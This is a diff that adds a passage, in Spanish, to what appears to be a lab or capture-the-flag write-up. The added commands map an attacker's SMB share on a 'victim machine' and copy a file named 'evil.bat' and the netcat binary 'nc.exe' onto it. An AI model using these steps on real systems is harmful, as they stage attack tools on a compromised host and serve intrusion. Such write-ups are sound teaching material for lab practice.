@@ -189,6 +189,23 @@ Nos dará un error que nos indica que no se nos permite importar archivos sin un
 impacket-smbserver smbFolder $(pwd) -smb2support -username test -password test
 ```
 
+Ahora en la maquina victima crearemos una unidad lógica y que se sincronice con el fichero *smbFolder* a nivel de red
+```shell
+net use x: \\10.10.14.226\smbFolder /user:test test
+```
+
+Ahora si listamos el contenido de dentro de la nueva unidad lógica llamada `X:` podremos ver los archivos compartidos a nivel de red
+```shell
+dir x:\
+```
+
+Y así poder moverlos directamente a `C:\temp`
+```shell
+copy x:\evil.bat evil.bat
+```
+```shell
+copy x:\nc.exe nc.exe
+```
 
 
 
